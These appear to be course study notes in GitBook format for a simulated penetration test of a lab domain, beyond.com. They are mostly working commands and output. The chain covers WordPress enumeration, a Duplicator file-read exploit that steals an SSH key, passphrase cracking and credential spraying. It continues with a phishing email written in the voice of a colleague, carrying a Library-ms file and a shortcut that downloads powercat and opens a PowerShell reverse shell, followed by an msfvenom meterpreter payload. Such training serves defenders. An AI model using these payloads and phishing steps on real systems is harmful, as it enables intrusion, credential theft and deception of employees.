---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 26: Assembling the Pieces

## Enumerating the Public Network

### MAILSRV1

{% code overflow="wrap" %}
```bash
# Setting up a basic directory structure for the assessment
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```
{% endcode %}

{% hint style="warning" %}
Documenting our findings is a crucial process for every penetration test. For this Module, we'll store results in the basic work environment we just set up. However, Markdown editors, such as _Obsidian_, have become quite popular for documenting findings and data in real assessments as they are application-independent and contain functions that will simplify report writing and collaboration.
{% endhint %}

Beginning with a port scan:

{% code overflow="wrap" %}
```bash
# We'll use -sV to enable service and version detection as well as -sC to use Nmap's default scripts. In addition, we'll enter -oN to create an output file containing the scan results.
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-29T12:54:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```
{% endcode %}

{% hint style="warning" %}
In a real penetration test, we would also use passive information gathering techniques such as _Google Dorks_ and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.

\
Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.
{% endhint %}

Trying to bust some directories:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># We'll enter dir to use directory enumeration mode, -u for the URL, -w for a wordlist, and -x for file types we want to identify. For this example, we'll enter txt, pdf, and config to identify potential documents or configuration files. In addition, we'll use -o to create an output file.
</strong><strong>kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
</strong>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,pdf,config
[+] Timeout:                 10s
===============================================================
2022/09/29 11:12:27 Starting gobuster in directory enumeration mode
===============================================================

                                
===============================================================
2022/09/29 11:16:00 Finished
===============================================================
</code></pre>

{% hint style="warning" %}
Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.
{% endhint %}

### WEBSRV1

{% hint style="info" %}
In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.
{% endhint %}

Nmap scanning new target:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 11:18 EDT
Nmap scan report for 192.168.50.244
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.50.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```
{% endcode %}

Using **whatweb** to determine the technology stack of the webpage:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ whatweb http://192.168.50.244                                                        
http://192.168.50.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], RedirectLocation[http://192.168.50.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.50.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```
{% endcode %}

Using **wpscan** to enumerate wordpress vulnerabilities:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># To perform the scan without an API key, we'll provide the URL of the target for --url, set the plugin detection to aggressive, and specify to enumerate all popular plugins by entering p as an argument to --enumerate. In addition, we'll use -o to create an output file.
</strong><strong>kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
</strong>
kali@kali:~/beyond$ cat websrv1/wpscan
...

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.50.244/wp-content/plugins/akismet/
 | Latest Version: 5.0
 | Last Updated: 2022-07-26T16:13:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.50.244/wp-content/plugins/classic-editor/
 | Latest Version: 1.6.2 
 | Last Updated: 2021-07-21T22:08:00.000Z
...

[+] contact-form-7
 | Location: http://192.168.50.244/wp-content/plugins/contact-form-7/
 | Latest Version: 5.6.3 (up to date)
 | Last Updated: 2022-09-01T08:48:00.000Z
...

[+] duplicator
 | Location: http://192.168.50.244/wp-content/plugins/duplicator/
 | Last Updated: 2022-09-24T17:57:00.000Z
 | Readme: http://192.168.50.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.50.244/wp-content/plugins/elementor/
 | Latest Version: 3.7.7 (up to date)
 | Last Updated: 2022-09-20T14:51:00.000Z
...

[+] wordpress-seo
 | Location: http://192.168.50.244/wp-content/plugins/wordpress-seo/
 | Latest Version: 19.7.1 (up to date)
 | Last Updated: 2022-09-20T14:10:00.000Z
...
</code></pre>

Using **searchsploit** to search for vulnerabilities in plugins discovered, staring with the outdated duplicator plugin:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ searchsploit duplicator    
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                    | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery       | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                              | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                             | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                   | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                            | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery       | php/webapps/40908.html
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
{% endcode %}

## Attacking a Public Machine

### Initial Foothold

Examining an exploit found via searchsploit:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ searchsploit -x 50420
```
{% endcode %}

Using the exploit to get **daniela**'s private ssh key:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

```
{% endcode %}

Making the private key usable and finding it has a passphrase:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa

kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 
```
{% endcode %}



Cracking the passphrase on the private key:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa) 
...
```
{% endcode %}

Using the private key with the cracked passphrase:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 

Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$ 
```
{% endcode %}

### A Link to the Past

1. _Host linpeas.sh via `python3 -m http.server 80`_
2. _Transfer to websrv1_
3. _Run linpeas.sh_
4. _Decide on path of attack. In our case we abuse being able to execute `git` with sudo, without a password._
5. _Check out the git history via `git log` then display the differences with `git show` to avoid disrupting the client's web server._

## Gaining Access to the Internal Network

### Domain Credentials

Using crackmapexec with the credentials we've discovered so far:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```
{% endcode %}

This shows that john has valid credentials to MAILSRV1, we've identified the domain name as **beyond.com** and reviewing nmap shows there likely aren't any services we can utilize our validated credentials on.

This leave us with two options:\
1\. Further enumerate SMB on MAILSRV1, checking for sensitive data on accessible shares.\
2\. Prepare a malicious attachment and send a phishing email as _john_ to _daniela_ and _marcus_.

Using **crackmapexec** to list SMB shares:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
```
{% endcode %}

No dice, time to do some phishing.

### Phishing for Access

Prepping the WebDAV share:

{% code overflow="wrap" %}
```bash
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
```
{% endcode %}

Creating our malicious attachment:

{% code title="config.Library-ms" overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

Now let's make a shortcut to execute a reverse shell:

{% code title="install.lnk" overflow="wrap" %}
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
{% endcode %}

Copying powercat to our current directory, hosting it via python as well as starting a netcat listener:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000 &
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

kali@kali:~/beyond$ nc -nvlp 4444 & 
listening on [any] 4444 ...
```
{% endcode %}

Using _swaks_ to send the email:

{% code overflow="wrap" %}
```bash
# Creating the body in body.txt
kali@kali:~/beyond$ cat body.txt
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John

# Now we are ready to build the swaks command to send the emails. We'll provide daniela@beyond.com and marcus@beyond.com as recipients of the email to -t, john@beyond.com as name on the email envelope (sender) to --from, and the Windows Library file to --attach. Next, we'll enter --suppress-data to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide Subject: Staging Script to --header and body.txt to --body. In addition, we'll enter the IP address of MAILSRV1 for --server. Finally, we'll add -ap to enable password authentication.
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
{% endcode %}

Waiting a few moments...

{% code overflow="wrap" %}
```powershell
listening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```
{% endcode %}

## Enumerating the Internal Network

### Situational Awareness

Grabbing and running winPEAS:

{% code overflow="wrap" %}
```powershell
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus

PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe

PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
...
```
{% endcode %}

WinPEAS is not always correct, validate information when you can:

```powershell
// Result from winPEAS
����������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional

// Result from systeminfo
PS C:\Users\marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

Using the network information and known hosts to update our **computers.txt**:

{% code overflow="wrap" %}
```powershell
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
        Gateways: 172.16.6.254
        DNSs: 172.16.6.240
        Known hosts:
          169.254.255.255       00-00-00-00-00-00     Invalid
          172.16.6.240          00-50-56-8A-08-34     Dynamic
          172.16.6.254          00-50-56-8A-DA-71     Dynamic
          172.16.6.255          FF-FF-FF-FF-FF-FF     Static
...

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.6.240
    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.6.254
```
{% endcode %}

```bash
kali@kali:~/beyond$ cat computer.txt                                        
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

No privilege escalation vector found, moving on to enumerating the AD environment and its objects.

Starting with SharpHound:

```bash
kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

{% code overflow="wrap" %}
```powershell
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2022-10-10T07:24:34.5781410-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:34.5937984-07:00|INFORMATION|Initializing SharpHound at 7:24 AM on 10/10/2022
2022-10-10T07:24:35.0781142-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:35.3281888-07:00|INFORMATION|Beginning LDAP search for beyond.com
2022-10-10T07:24:35.3906114-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-10-10T07:24:35.3906114-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-10-10T07:25:06.1421842-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 92 MB RAM
2022-10-10T07:25:21.6307386-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-10-10T07:25:21.6932468-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Status: 98 objects finished (+98 2.130435)/s -- Using 103 MB RAM
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Enumeration finished in 00:00:46.5180822
2022-10-10T07:25:21.9414294-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
 58 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-10-10T07:25:21.9570748-07:00|INFORMATION|SharpHound Enumeration Completed at 7:25 AM on 10/10/2022! Happy Graphing!
```
{% endcode %}

Listing files to locate the zip archive with our enumeration results:

{% code overflow="wrap" %}
```powershell
PS C:\Users\marcus> dir  
dir

    Directory: C:\Users\marcus

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         9/29/2022   1:49 AM                Contacts                                                             
d-r---         9/29/2022   1:49 AM                Desktop                                                              
d-r---         9/29/2022   4:37 AM                Documents                                                            
d-r---         9/29/2022   4:33 AM                Downloads                                                            
d-r---         9/29/2022   1:49 AM                Favorites                                                            
d-r---         9/29/2022   1:49 AM                Links                                                                
d-r---         9/29/2022   1:49 AM                Music                                                                
d-r---         9/29/2022   1:50 AM                OneDrive                                                             
d-r---         9/29/2022   1:50 AM                Pictures                                                             
d-r---         9/29/2022   1:49 AM                Saved Games                                                          
d-r---         9/29/2022   1:50 AM                Searches                                                             
d-r---         9/29/2022   4:30 AM                Videos                                                               
-a----        10/10/2022   7:25 AM          11995 20221010072521_BloodHound.zip                                     
-a----        10/10/2022   7:23 AM        1318097 SharpHound.ps1                                                       
-a----        10/10/2022   5:02 AM        1936384 winPEAS.exe                                                          
-a----        10/10/2022   7:25 AM           8703 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin 
```
{% endcode %}

Starting an SMB server on our kali device to transfer the file:

{% code overflow="wrap" %}
```bash
kali@kali:~/Downloads$ sudo impacket-smbserver test . -smb2support -username test -password test
```
{% endcode %}

Copying the .zip over:

{% code overflow="wrap" %}
```powershell
PS C:\Users\marcus> net use m: \\192.168.119.5\test /user:test test
The command completed successfully.

PS C:\Users\marcus> copy 20221010072521_BloodHound.zip m:\
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>Upload Zip Archive to BloodHound</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption><p>Raw Query to show all Computer objects in the BEYOND.COM domain</p></figcaption></figure>

Clicking on each object shown will display information about the object:

```powershell
DCSRV1.BEYOND.COM - Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM - Windows 11 Pro
```

A new host was discovered, let's use nslookup to find its IP address:

```powershell
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.6.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.6.241
```

{% hint style="warning" %}
We could have also used PowerView or LDAP queries to obtain all of this information. However, in most penetration tests, we want to use BloodHound first as the output of the other methods can be quite overwhelming. It's an effective and powerful tool to gain a deeper understanding of the Active Directory environment in a short amount of time. We can also use raw or pre-built queries to identify highly complex attack vectors and display them in an interactive graphical view.
{% endhint %}

### Services and Sessions

Cypher is a querynig language, so we can build a relationship query with the following syntax **(NODES) - \[:RELATIONSHIP] -> (NODES)**.

In our example, we'll query for active sessions on computers by users:

```splunk-spl
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>Display all active sessions in the BEYOND.COM domain</p></figcaption></figure>

We see Beccy, a domain admin, has an active session on MAILSRV1. We may be able to extract their NTLM hash if we get privileged access on MAILSRV1. BloodHound uses SIDs to represent local accounts, in this case the RID 500 implies there is an active session of the local Administrator on INTERNALSRV1.

Now we'll identify all _kerberoastable_ users in the domain with the _List all Kerberoastable Accounts_ pre-built query in BloodHound.

{% hint style="info" %}
The _krbtgt_ user account acts as service account for the _Key Distribution Center_ (KDC) and is responsible for encrypting and signing Kerberos tickets. When a domain is set up, a password is randomly generated for this user account, making a password attack unfeasible. Therefore, we can often safely skip _krbtgt_ in the context of Kerberoasting.
{% endhint %}

Even though we've found the SPN for daniela indicating a web server is running on INTERNALSRV1, we should **collect all information, prioritize it, and **_**then**_** perform potential attacks**.

Creating a staged meterpreter TCP reverse shell as an executable:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```
{% endcode %}

Starting a _multi/handler_ listener with corresponding settings with **ExitOnSession** set to **false** so we don't need to restart the listener every time:

```bash
kali@kali:~/beyond$ sudo msfconsole -q

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

